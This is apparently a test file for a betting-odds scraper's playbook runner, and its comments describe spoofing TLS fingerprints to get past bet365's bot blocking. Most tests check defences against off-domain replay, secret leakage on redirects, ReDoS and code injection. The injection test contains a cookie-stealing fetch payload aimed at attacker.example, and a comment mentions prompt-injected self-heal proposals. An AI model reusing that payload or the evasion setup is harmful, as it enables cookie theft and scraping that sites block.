import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock the network + browser boundaries.
//   T0  — abrasio-sdk's StealthClient (TLS/JA3/JA4 fingerprint spoofing; wired in
//         2026-07-15, replacing plain fetch — see playbook-runner.ts's T0 comment for
//         why: bet365's odds feed 403s a bare fetch()/httpx regardless of headers, but
//         a real browser fingerprint gets a clean 200). Falls back to undici's `fetch`
//         only if the native backend isn't installed (TLSFingerprintError).
//   T1  — still plain undici `fetch` + Cheerio (unchanged from M1).
//   T2  — openAbrasioPersistentPage (correction C1: signature is (url, timeout, opts) —
//         no leased profile).
const { mockStealthRequest, mockStealthClose } = vi.hoisted(() => ({
  mockStealthRequest: vi.fn(),
  mockStealthClose: vi.fn(async () => {}),
}));

vi.mock("undici", () => ({ fetch: vi.fn() }));
vi.mock("abrasio-sdk", () => {
  class MockTLSFingerprintError extends Error {}
  return {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    StealthClient: vi.fn().mockImplementation(function (this: any) {
      this.request = mockStealthRequest;
      this.close = mockStealthClose;
    }),
    TLSFingerprintError: MockTLSFingerprintError,
  };
});
vi.mock("../engine/abrasio-engine.js", () => ({
  isAbrasioAvailable: vi.fn(() => true),
  openAbrasioPersistentPage: vi.fn(),
}));

import { fetch } from "undici";
import { TLSFingerprintError } from "abrasio-sdk";
import { openAbrasioPersistentPage } from "../engine/abrasio-engine.js";
import { runPlaybook } from "./playbook-runner.js";

const mockFetch = fetch as unknown as ReturnType<typeof vi.fn>;
const mockOpen = openAbrasioPersistentPage as unknown as ReturnType<typeof vi.fn>;

/** Shape returned by StealthClient.request() — matches StealthResponse's public API. */
function stealthResponse(statusCode: number, body: unknown) {
  return { statusCode, text: JSON.stringify(body) };
}

function jsonResponse(status: number, body: unknown) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: () => "application/json" },
    json: async () => body,
    text: async () => JSON.stringify(body),
  };
}

function textResponse(status: number, html: string) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: () => "text/html" },
    text: async () => html,
  };
}

// A Playwright-compatible fake page whose primitives are individually controllable.
function fakePage(overrides: Record<string, unknown> = {}) {
  return {
    goto: vi.fn(async () => ({ status: () => 200 })),
    click: vi.fn(async () => {}),
    fill: vi.fn(async () => {}),
    hover: vi.fn(async () => {}),
    press: vi.fn(async () => {}),
    waitForSelector: vi.fn(async () => ({})),
    waitForLoadState: vi.fn(async () => {}),
    waitForTimeout: vi.fn(async () => {}),
    evaluate: vi.fn(async () => null),
    content: vi.fn(async () => "<html><body><div class='odds'>1.5</div></body></html>"),
    url: () => "https://book.example/",
    keyboard: { press: vi.fn(async () => {}) },
    mouse: { wheel: vi.fn(async () => {}) },
    ...overrides,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  mockOpen.mockReset();
  mockStealthRequest.mockReset();
  mockStealthClose.mockReset();
});

// ── T0 (http) ────────────────────────────────────────────────────────────────

describe("runPlaybook — T0 (http)", () => {
  const t0Playbook = {
    transport: "http",
      domain: "book.example",
    steps: [
      {
        op: "request",
        request: {
          method: "GET",
          url: "https://book.example/api/odds",
          headers: {},
          response_path: "$.odds",
        },
        url: "https://book.example/api/odds",
      },
    ],
  };

  it("uses StealthClient (not plain fetch), applies response_path, opens NO browser", async () => {
    mockStealthRequest.mockResolvedValueOnce(stealthResponse(200, { odds: [1.5, 2.0] }));

    const result = await runPlaybook(t0Playbook as never, {});

    expect(mockStealthRequest).toHaveBeenCalledTimes(1);
    expect(mockFetch).not.toHaveBeenCalled(); // no plain-fetch fallback needed
    expect(mockOpen).not.toHaveBeenCalled(); // no browser on the hot path
    expect(result.ok).toBe(true);
    expect(JSON.stringify(result.data)).toContain("1.5");
    expect(mockStealthClose).toHaveBeenCalled(); // session released after the run
  });

  it("resolves secret_ref: header values from the secrets map (raw token never inlined)", async () => {
    mockStealthRequest.mockResolvedValueOnce(stealthResponse(200, { odds: [1.1] }));
    const pb = {
      transport: "http",
      domain: "book.example",
      steps: [
        {
          op: "request",
          url: "https://book.example/api/odds",
          request: {
            method: "GET",
            headers: { authorization: "secret_ref:session_token" },
            response_path: "$.odds",
          },
        },
      ],
    };

    await runPlaybook(pb as never, { session_token: "TOK-XYZ-123" });

    // StealthClient.request(method, url, options) — headers live in options.headers.
    const [, , options] = mockStealthRequest.mock.calls[0] as [string, string, { headers?: Record<string, string> }];
    const sent = JSON.stringify(options?.headers ?? {});
    expect(sent).toContain("TOK-XYZ-123");
    expect(sent).not.toContain("secret_ref");
  });

  it("token dead (401) → reason:'token'", async () => {
    mockStealthRequest.mockResolvedValueOnce(stealthResponse(401, { error: "expired" }));
    const result = await runPlaybook(t0Playbook as never, {});
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("token");
    expect(mockOpen).not.toHaveBeenCalled();
  });

  it("token dead (403) → reason:'token'", async () => {
    mockStealthRequest.mockResolvedValueOnce(stealthResponse(403, { error: "forbidden" }));
    const result = await runPlaybook(t0Playbook as never, {});
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("token");
  });

  it("unresolvable response_path → reason:'response_shape'", async () => {
    mockStealthRequest.mockResolvedValueOnce(stealthResponse(200, { totally: "different" }));
    const pb = {
      transport: "http",
      domain: "book.example",
      steps: [
        {
          op: "request",
          url: "https://book.example/api/odds",
          request: { method: "GET", headers: {}, response_path: "$.markets[*].odds" },
        },
      ],
    };
    const result = await runPlaybook(pb as never, {});
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("response_shape");
  });

  it("refuses to replay a T0 step whose URL is off the playbook's own domain", async () => {
    // Bug found in review, 2026-08-11: self-heal's validateHealProposal enforced an
    // off-domain check on an LLM-PROPOSED url, but ordinary replay of a playbook's own
    // (already-persisted) steps enforced nothing — a bad domain/url pairing at RECORD
    // time, or a tampered `steps` array, replayed off-domain with secret headers
    // attached and nothing upstream caught it.
    const pb = {
      transport: "http",
      domain: "book.example",
      steps: [
        {
          op: "request",
          url: "https://attacker.example/api/odds",
          request: { method: "GET", headers: {}, response_path: "$.odds" },
        },
      ],
    };
    const result = await runPlaybook(pb as never, {});
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("response_shape");
    expect(mockStealthRequest).not.toHaveBeenCalled(); // never even attempted the request
  });

  it("disables redirect-following when a request header carries a resolved secret", async () => {
    // Bug found in review, 2026-08-11: undici only strips host/authorization/cookie/
    // proxy-authorization on a cross-origin redirect, not arbitrary header names — which
    // is exactly what a secret_ref header usually is (X-Api-Key, X-Auth-Token, ...).
    // abrasio-sdk's StealthClient has no per-hop redirect control, so the only safe
    // option is to never follow a redirect at all once a secret is attached.
    mockStealthRequest.mockResolvedValueOnce(stealthResponse(200, { odds: [1.1] }));
    const pb = {
      transport: "http",
      domain: "book.example",
      steps: [
        {
          op: "request",
          url: "https://book.example/api/odds",
          request: { method: "GET", headers: { "X-Api-Key": "secret_ref:api_key" }, response_path: "$.odds" },
        },
      ],
    };
    await runPlaybook(pb as never, { api_key: "SEKRIT" });
    const [, , options] = mockStealthRequest.mock.calls[0] as [string, string, { allowRedirects?: boolean }];
    expect(options?.allowRedirects).toBe(false);
  });

  it("still allows redirects when no secret header is attached", async () => {
    mockStealthRequest.mockResolvedValueOnce(stealthResponse(200, { odds: [1.1] }));
    const result = await runPlaybook(t0Playbook as never, {});
    expect(result.ok).toBe(true);
    const [, , options] = mockStealthRequest.mock.calls[0] as [string, string, { allowRedirects?: boolean }];
    expect(options?.allowRedirects).toBe(true);
  });

  it("falls back to plain fetch when the native stealth backend isn't installed", async () => {
    mockStealthRequest.mockRejectedValueOnce(new TLSFingerprintError("impers not installed"));
    mockFetch.mockResolvedValueOnce(jsonResponse(200, { odds: [3.0] }));

    const result = await runPlaybook(t0Playbook as never, {});

    expect(mockStealthRequest).toHaveBeenCalledTimes(1);
    expect(mockFetch).toHaveBeenCalledTimes(1);
    expect(result.ok).toBe(true);
    expect(JSON.stringify(result.data)).toContain("3");
  });

  it("does not retry the stealth backend per-step once it's known unavailable", async () => {
    mockStealthRequest.mockRejectedValue(new TLSFingerprintError("impers not installed"));
    mockFetch
      .mockResolvedValueOnce(jsonResponse(200, { odds: [1] }))
      .mockResolvedValueOnce(jsonResponse(200, { odds: [2] }));
    const pb = {
      transport: "http",
      domain: "book.example",
      steps: [
        { op: "request", url: "https://book.example/a", request: { method: "GET", headers: {}, response_path: "$.odds" } },
        { op: "request", url: "https://book.example/b", request: { method: "GET", headers: {}, response_path: "$.odds" } },
      ],
    };

    await runPlaybook(pb as never, {});

    // Only the FIRST step probes stealth and fails; the second skips straight to fetch.
    expect(mockStealthRequest).toHaveBeenCalledTimes(1);
    expect(mockFetch).toHaveBeenCalledTimes(2);
  });

  // response_format:"text" — non-JSON feeds (e.g. bet365's pipe-delimited odds) that
  // response_path/JSONPath has no way to address.
  describe("response_format:'text' + response_pattern (non-JSON feeds)", () => {
    const textPlaybook = (pattern: string | null) => ({
      transport: "http",
      domain: "book.example",
      steps: [
        {
          op: "request",
          url: "https://book.example/feed",
          request: { method: "GET", headers: {}, response_format: "text", response_pattern: pattern },
        },
      ],
    });

    /** Unlike stealthResponse(), does NOT JSON.stringify the body — response_format:"text"
     *  never touches JSON at all, so the mock must return the raw string as-is. */
    function stealthTextResponse(statusCode: number, text: string) {
      return { statusCode, text };
    }

    it("extracts capture group 1 for a single match", async () => {
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, "TEAM|Arsenal|ODDS|1.85"));
      const result = await runPlaybook(textPlaybook("ODDS\\|([0-9.]+)") as never, {});
      expect(result.ok).toBe(true);
      expect(result.data).toBe("1.85");
    });

    it("never attempts JSON.parse on the body, even if it looks JSON-ish", async () => {
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, 'not-json|{"still":"not parsed"}|1.5'));
      const result = await runPlaybook(textPlaybook("\\|([0-9.]+)$") as never, {});
      expect(result.ok).toBe(true);
      expect(result.data).toBe("1.5");
    });

    it("collects ALL matches into an array when the pattern matches more than once", async () => {
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, "ODDS|1.5\nODDS|2.0\nODDS|3.25"));
      const result = await runPlaybook(textPlaybook("ODDS\\|([0-9.]+)") as never, {});
      expect(result.ok).toBe(true);
      expect(result.data).toEqual(["1.5", "2.0", "3.25"]);
    });

    it("no match at all -> reason:'response_shape' (site changed feed format, heal)", async () => {
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, "totally different format now"));
      const result = await runPlaybook(textPlaybook("ODDS\\|([0-9.]+)") as never, {});
      expect(result.ok).toBe(false);
      expect(result.reason).toBe("response_shape");
    });

    it("no response_pattern configured -> returns the raw body text unchanged", async () => {
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, "raw-feed-body|as-is"));
      const result = await runPlaybook(textPlaybook(null) as never, {});
      expect(result.ok).toBe(true);
      expect(result.data).toBe("raw-feed-body|as-is");
    });

    it("a catastrophic-backtracking-shaped pattern is rejected (treated as no match), never hangs", async () => {
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, "a".repeat(40) + "!"));
      const start = Date.now();
      const result = await runPlaybook(textPlaybook("(a+)+$") as never, {});
      expect(Date.now() - start).toBeLessThan(2000); // proves it didn't hang catastrophically
      expect(result.ok).toBe(false);
      expect(result.reason).toBe("response_shape");
    });

    it("an invalid regex is rejected (treated as no match), not thrown out of the job", async () => {
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, "anything"));
      const result = await runPlaybook(textPlaybook("([unterminated") as never, {});
      expect(result.ok).toBe(false);
      expect(result.reason).toBe("response_shape");
    });

    it("a pattern that bypasses the static heuristic (alternation-based backtracking) still can't hang the worker", async () => {
      // Bug found in review, 2026-08-11: isUnsafeResponsePattern's denylist only catches
      // a quantifier NESTED inside a quantified group — it does not catch alternation,
      // e.g. `(a|a)*$` passes the heuristic and, measured directly, hangs a plain
      // `new RegExp(...).exec()` for 27+ seconds on a 30-character input. The real
      // defense is execTimedRegex()'s worker-thread wall-clock timeout, which this test
      // proves by asserting the call still returns quickly despite the heuristic missing
      // the shape.
      mockStealthRequest.mockResolvedValueOnce(stealthTextResponse(200, "a".repeat(30) + "!"));
      const start = Date.now();
      const result = await runPlaybook(textPlaybook("(a|a)*$") as never, {});
      expect(Date.now() - start).toBeLessThan(2000); // proves the timeout, not the heuristic, saved us
      expect(result.ok).toBe(false);
      expect(result.reason).toBe("response_shape");
    }, 10_000);
  });
});

// ── T1 (http_render) ─────────────────────────────────────────────────────────

describe("runPlaybook — T1 (http_render)", () => {
  it("uses an HTTP GET + Cheerio parse, opens NO browser", async () => {
    mockFetch.mockResolvedValueOnce(
      textResponse(200, "<html><body><div class='odds'>2.75</div></body></html>")
    );
    const pb = {
      transport: "http_render",
        domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/odds" },
        { op: "extract", selector: ".odds" },
      ],
    };

    const result = await runPlaybook(pb as never, {});

    expect(mockFetch).toHaveBeenCalled();
    expect(mockOpen).not.toHaveBeenCalled(); // cheerio path, no browser
    expect(result.ok).toBe(true);
  });

  it("refuses to replay a T1 navigate step whose URL is off the playbook's own domain", async () => {
    const pb = {
      transport: "http_render",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://attacker.example/odds" },
        { op: "extract", selector: ".odds" },
      ],
    };
    const result = await runPlaybook(pb as never, {});
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("response_shape");
    expect(mockFetch).not.toHaveBeenCalled();
  });
});

// ── T2 (browser) ─────────────────────────────────────────────────────────────

describe("runPlaybook — T2 (browser)", () => {
  it("opens a browser via openAbrasioPersistentPage(url, timeout, opts) — no leased profile (C1)", async () => {
    const page = fakePage();
    const close = vi.fn(async () => {});
    mockOpen.mockResolvedValue({ page, close });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [{ op: "navigate", url: "https://book.example/" }],
    };
    await runPlaybook(pb as never, {});

    expect(mockOpen).toHaveBeenCalledTimes(1);
    const firstArg = mockOpen.mock.calls[0][0];
    expect(typeof firstArg).toBe("string"); // a URL, not a profile id
    expect(firstArg).toContain("book.example");
    expect(close).toHaveBeenCalled(); // returned in finally
  });

  it("a non-optional selector failure → reason:'selector' with break location", async () => {
    const page = fakePage({
      click: vi.fn(async () => {
        throw new Error("selector not found");
      }),
    });
    const close = vi.fn(async () => {});
    mockOpen.mockResolvedValue({ page, close });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/" },
        { op: "click", selector: "button#login" },
      ],
    };
    const result = await runPlaybook(pb as never, {});

    expect(result.ok).toBe(false);
    expect(result.reason).toBe("selector");
    expect(result.brokeAtIndex).toBe(1);
    expect(result.brokeStep).toMatchObject({ op: "click", selector: "button#login" });
    expect(close).toHaveBeenCalled();
  });

  it("refuses to navigate a T2 step off the playbook's own domain", async () => {
    const page = fakePage();
    const close = vi.fn(async () => {});
    mockOpen.mockResolvedValue({ page, close });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/" },
        { op: "navigate", url: "https://attacker.example/steal" },
      ],
    };
    const result = await runPlaybook(pb as never, {});

    expect(result.ok).toBe(false);
    expect(result.brokeAtIndex).toBe(1);
    expect(page.goto).toHaveBeenCalledTimes(1); // only the first, on-domain navigate ran
  });

  it("clamps an out-of-range step.timeout instead of passing it straight to Playwright", async () => {
    // Bug found in review, 2026-08-11: step.timeout is untyped JSON at runtime (a heal
    // proposal or tampered payload could set it arbitrarily high) — a
    // `{op:"wait_for", timeout: 86400000}` could hold a browser (one of a small, fixed
    // worker pool) for 24 hours with nothing bounding it.
    const waitForSelector = vi.fn(async () => ({}));
    const page = fakePage({ waitForSelector });
    mockOpen.mockResolvedValue({ page, close: vi.fn(async () => {}) });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/" },
        { op: "wait_for", selector: ".odds", timeout: 86_400_000 },
      ],
    };
    await runPlaybook(pb as never, {});

    const [, options] = waitForSelector.mock.calls[0] as unknown as [string, { timeout?: number }];
    expect(options?.timeout).toBeLessThanOrEqual(120_000);
  });

  it("an OPTIONAL step that fails is skipped, not treated as a break", async () => {
    const page = fakePage({
      waitForSelector: vi.fn(async () => {
        throw new Error("never appeared");
      }),
    });
    mockOpen.mockResolvedValue({ page, close: vi.fn(async () => {}) });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/" },
        { op: "wait_for", selector: ".cookie-banner", timeout: 500, optional: true },
      ],
    };
    const result = await runPlaybook(pb as never, {});

    // The optional failure must not surface as a selector break.
    expect(result.reason).not.toBe("selector");
    expect(result.brokeAtIndex).toBeUndefined();
  });

  it("scroll: a valid numeric pixels value is passed through", async () => {
    const evaluate = vi.fn(async (_body?: string) => null);
    const page = fakePage({ evaluate });
    mockOpen.mockResolvedValue({ page, close: vi.fn(async () => {}) });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/" },
        { op: "scroll", pixels: 1200 },
      ],
    };
    await runPlaybook(pb as never, {});

    const scrollCall = evaluate.mock.calls.find(([body]) => String(body).includes("scrollBy"));
    expect(scrollCall?.[0]).toContain("window.scrollBy(0, 1200)");
  });

  it("scroll: a non-numeric/malicious pixels value cannot inject code — falls back to the default", async () => {
    const evaluate = vi.fn(async (_body?: string) => null);
    const page = fakePage({ evaluate });
    mockOpen.mockResolvedValue({ page, close: vi.fn(async () => {}) });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/" },
        // Bug found in review, 2026-07-15: this used to be interpolated directly into
        // the evaluate() string, so a non-numeric `pixels` (e.g. from a self-heal
        // proposal shaped by prompt injection) could inject arbitrary JS.
        { op: "scroll", pixels: "0);fetch('https://attacker.example/exfil?c='+document.cookie);//" },
      ],
    };
    await runPlaybook(pb as never, {});

    const scrollCall = evaluate.mock.calls.find(([body]) => String(body).includes("scrollBy"));
    expect(scrollCall?.[0]).toBe("window.scrollBy(0, 800)"); // safe default, not the raw string
    expect(scrollCall?.[0]).not.toContain("attacker.example");
    expect(scrollCall?.[0]).not.toContain("fetch");
  });

  it("scroll: an out-of-range pixels value is clamped, not passed through unbounded", async () => {
    const evaluate = vi.fn(async (_body?: string) => null);
    const page = fakePage({ evaluate });
    mockOpen.mockResolvedValue({ page, close: vi.fn(async () => {}) });

    const pb = {
      transport: "browser",
      domain: "book.example",
      steps: [
        { op: "navigate", url: "https://book.example/" },
        { op: "scroll", pixels: 99_999_999 },
      ],
    };
    await runPlaybook(pb as never, {});

    const scrollCall = evaluate.mock.calls.find(([body]) => String(body).includes("scrollBy"));
    expect(scrollCall?.[0]).toBe("window.scrollBy(0, 100000)");
  });
});
